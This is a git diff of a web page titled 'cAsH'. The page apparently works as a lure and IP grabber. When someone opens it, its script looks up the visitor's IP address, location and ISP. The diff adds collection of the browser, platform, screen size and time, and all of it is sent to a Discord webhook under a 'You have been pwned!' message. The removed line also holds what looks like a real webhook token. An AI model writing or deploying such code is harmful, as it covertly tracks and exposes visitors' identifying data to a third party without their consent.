@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <title>cAsH</title>
     <style>
@@ -80,6 +80,12 @@
                 const geoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
                 const geoData = await geoResponse.json();
 
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const timestamp = new Date().toLocaleString();
+
                 document.getElementById('ip-address-value').textContent = userIP;
                 document.getElementById('ip-info').textContent = JSON.stringify(geoData, null, 2);
 
@@ -90,12 +96,16 @@
 **User IP:** ${userIP}
 **Location:** ${geoData.city}, ${geoData.region}, ${geoData.country}
 **ISP:** ${geoData.org || "Unknown"}
+**Browser:** ${userAgent}
+**Platform:** ${platform}
+**Screen Resolution:** ${screenWidth}x${screenHeight}
+**Timestamp:** ${timestamp}
 
 ||@everyone|| **You have been pwned!**
                 `;
 
                 // Send to Discord Webhook
-                await fetch("https://discord.com/api/webhooks/1328900605896429612/-KgtIr5H2_vXUJnpQvHEHswyrDT20z-WkVAm0mYnb_I23dqfVqPqSmzUBdc9PvwCA9vi", {
+                await fetch("https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
